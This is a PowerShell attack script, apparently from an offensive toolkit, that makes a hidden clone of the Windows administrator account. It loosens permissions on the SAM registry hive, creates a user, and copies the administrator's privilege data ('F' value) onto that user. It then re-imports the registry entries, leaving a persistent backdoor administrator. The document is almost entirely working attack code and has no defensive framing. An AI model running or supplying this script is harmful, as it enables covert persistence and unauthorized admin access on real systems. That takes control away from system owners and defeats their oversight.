function Create-Clone
{
<#
.SYNOPSIS
This script requires Administrator privileges. use Invoke-TokenManipulation.ps1 to get system privileges and create the clone user.
.PARAMETER u
The clone username
.PARAMETER p
The clone user's password
.PARAMETER cu
The user to clone, default administrator 
.EXAMPLE
Create-Clone -u evi1cg -p evi1cg123 -cu administrator
#>
    Param(
        [Parameter(Mandatory=$true)]
        [String]
        $u,
  
        [Parameter(Mandatory=$true)]
        [String]
        $p,
  
        [Parameter(Mandatory=$false)]
        [String]
        $cu = "administrator"
    )
    function upReg{
        "HKEY_LOCAL_MACHINE\SAM [1 17]" | Out-File $env:temp\up.ini
        "HKEY_LOCAL_MACHINE\SAM\SAM [1 17]"| Out-File -Append  $env:temp\up.ini
        "HKEY_LOCAL_MACHINE\SAM\SAM\Domains [1 17]" | Out-File -Append  $env:temp\up.ini
        "HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account [1 17] "| Out-File -Append  $env:temp\up.ini
        "HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users [1 17] "| Out-File -Append  $env:temp\up.ini
        "HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names [1 17]"| Out-File -Append  $env:temp\up.ini
        cmd /c "regini $env:temp\up.ini"
        Remove-Item $env:temp\up.ini
      
    }
    function downreg {
        "HKEY_LOCAL_MACHINE\SAM [1 17]" | Out-File $env:temp\down.ini
        "HKEY_LOCAL_MACHINE\SAM\SAM [17]"| Out-File -Append  $env:temp\down.ini
        "HKEY_LOCAL_MACHINE\SAM\SAM\Domains [17]" | Out-File -Append  $env:temp\down.ini
        "HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account [17] "| Out-File -Append  $env:temp\down.ini
        "HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users [17] "| Out-File -Append  $env:temp\down.ini
        "HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names [17]"| Out-File -Append  $env:temp\down.ini
        cmd /c "regini $env:temp\down.ini"
        Remove-Item $env:temp\down.ini
    }
    function Create-user ([string]$Username,[string]$Password) {
        $group = "Administrators"
        $existing = Test-Path -path "HKLM:\SAM\SAM\Domains\Account\Users\Names\$Username"
        if (!$existing) {
            Write-Host "[*] Creating new local user $Username with password $Password"
            & NET USER $Username $Password /add /y /expires:never | Out-Null
            Write-Host "[*] Adding local user $Username to $group."
            & NET LOCALGROUP $group $Username /add | Out-Null
              
        }
        else {
            Write-Host "[*] Adding existing user $Username to $group."
            & NET LOCALGROUP $group $Username /add | Out-Null
            $adsi = [ADSI]"WinNT://$env:COMPUTERNAME"
            $exist = $adsi.Children | where {$_.SchemaClassName -eq 'user' -and $_.Name -eq $Username }
            Write-Host "[*] Setting password for existing local user $Username"
            $exist.SetPassword($Password) 
        }
  
        Write-Host "[*] Ensuring password for $Username never expires."
        & WMIC USERACCOUNT WHERE "Name='$Username'" SET PasswordExpires=FALSE   | Out-Null  
    }
    function GetUser-Key([string]$user)
    {
        cmd /c " echo HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names\$user [1 17] >> $env:temp\$user.ini"
        cmd /c "regini $env:temp\$user.ini"
        Remove-Item $env:temp\$user.ini
        if(Test-Path -Path "HKLM:\SAM\SAM\Domains\Account\Users\Names\$user"){
            cmd /c "regedit /e $env:temp\$user.reg "HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names\$user""
            $file = Get-Content "$env:temp\$user.reg"  | Out-String
            $pattern="@=hex\((.*?)\)\:"
            $file -match $pattern |Out-Null
            $key = "00000"+$matches[1]
            Write-Host "[!]"$key
            return $key
        }else {
            Write-Host "[-] SomeThing Wrong !"
        }
          
    }
    function Clone ([string]$ukey,[string]$cukey) {
        "HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\$ukey [1 17] "| Out-File $env:temp\f.ini
        "HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\$cukey [1 17] " | Out-File $env:temp\f.ini
        cmd /c " regini $env:temp\f.ini"
        Remove-Item $env:temp\f.ini
        $ureg = "HKLM:\SAM\SAM\Domains\Account\Users\$ukey" |Out-String
        $cureg = "HKLM:\SAM\SAM\Domains\Account\Users\$cukey" |Out-String
        Write-Host "[*] Get clone user'F value"
        $cuFreg = Get-Item -Path $cureg.Trim()
        $cuFvalue = $cuFreg.GetValue('F')
        Write-Host "[*] Change user'F value"
        Set-ItemProperty -path $ureg.Trim()  -Name "F" -value $cuFvalue
        $outreg = "HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\$ukey"
        cmd /c "regedit /e $env:temp\out.reg $outreg.Trim()"
    }
    function Main () {
        if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
        {
            Write-Output "Script must be run as administrator" 
            break
        }
        Write-Output "[*] Start"
        Write-Output "[*] Tring to change reg privilege !"
        upReg
        if( !(Test-Path -path "HKLM:\SAM\SAM\Domains\Account\Users\Names\$cu")){
            Write-Host "[-] The User to Clone does not exist !"
            Write-Output "[*] Change reg privilege back !"
            downReg
            Write-Output "[*] Exiting !"
        }
        else {
            if(!(Test-Path -path "HKLM:\SAM\SAM\Domains\Account\Users\Names\$u")){
                $tmp = "1"
            }
            else{
                $tmp = "0"
            }
            Write-Output "[*] Create User..."
            Create-user $u $p
            Write-Output "[*] Get User $u's  Key .."
            $ukey = GetUser-Key $u |Out-String
            Write-Output "[*] Get User $cu's  Key .."
            $cukey = GetUser-Key $cu |Out-String
            Write-Output "[*] Clone User.."
            Clone $ukey $cukey
            if($tmp -eq 1 ){
                Write-Output "[*] Delete User.."
                cmd /c "net User $u /del " |Out-Null
            }else{ Write-Output "[*] Don't need to delete.."}
            cmd /c "regedit /s $env:temp\$u.reg"
            cmd /c "regedit /s $env:temp\out.reg"
            Remove-Item $env:temp\*.reg
            Write-Output "[*] Change reg privilege back !"
            downreg
            Write-Output "[*] Done"
        }      
    }
    Main
}